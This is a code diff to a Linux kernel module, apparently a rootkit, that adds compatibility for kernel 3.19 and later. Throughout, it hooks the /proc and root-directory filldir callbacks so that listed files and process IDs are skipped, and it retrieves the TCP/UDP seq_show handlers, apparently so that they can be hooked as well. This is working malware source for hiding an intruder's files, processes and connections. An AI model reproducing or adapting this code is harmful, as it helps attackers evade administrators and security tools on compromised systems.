@@ -16,8 +16,14 @@ static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
 static int (*udp4_seq_show)(struct seq_file *seq, void *v);
 static int (*udp6_seq_show)(struct seq_file *seq, void *v);
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+#else
+static int (*proc_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
+static int (*root_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
+#endif
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
 static int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
@@ -251,8 +257,10 @@ void *get_tcp_seq_show ( const char *path )
 
     #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
     afinfo = PDE(filep->f_dentry->d_inode)->data;
-    #else
+    #elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
     afinfo = PDE_DATA(filep->f_dentry->d_inode);
+    #else
+    afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
     #endif
     ret = afinfo->seq_ops.show;
 
@@ -272,9 +280,12 @@ void *get_udp_seq_show ( const char *path )
 
     #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
     afinfo = PDE(filep->f_dentry->d_inode)->data;
-    #else
+    #elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
     afinfo = PDE_DATA(filep->f_dentry->d_inode);
+    #else
+    afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
     #endif
+
     ret = afinfo->seq_ops.show;
 
     filp_close(filep, 0);
@@ -547,6 +558,8 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
     return ret;
 }
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+
 static int n_root_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
 {
     struct hidden_file *hf;
@@ -557,6 +570,21 @@ static int n_root_filldir( void *__buf, const char *name, int namelen, loff_t of
 
     return root_filldir(__buf, name, namelen, offset, ino, d_type);
 }
+
+#else
+
+static int n_root_filldir( struct dir_context *nrf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
+{
+    struct hidden_file *hf;
+
+    list_for_each_entry ( hf, &hidden_files, list )
+        if ( ! strcmp(name, hf->name) )
+            return 0;
+
+    return root_filldir(nrf_ctx, name, namelen, offset, ino, d_type);
+}
+
+#endif
 
 int n_root_iterate ( ITERATE_PROTO )
 {
@@ -571,6 +599,7 @@ int n_root_iterate ( ITERATE_PROTO )
     return ret;
 }
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
 {
     struct hidden_proc *hp;
@@ -585,6 +614,23 @@ static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t of
 
     return proc_filldir(__buf, name, namelen, offset, ino, d_type);
 }
+#else
+static int n_proc_filldir( struct dir_context *npf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
+{
+    struct hidden_proc *hp;
+    char *endp;
+    long pid;
+
+    pid = simple_strtol(name, &endp, 10);
+
+    list_for_each_entry ( hp, &hidden_procs, list )
+        if ( pid == hp->pid )
+            return 0;
+
+    return proc_filldir(npf_ctx, name, namelen, offset, ino, d_type);
+}
+
+#endif
 
 int n_proc_iterate ( ITERATE_PROTO )
 {
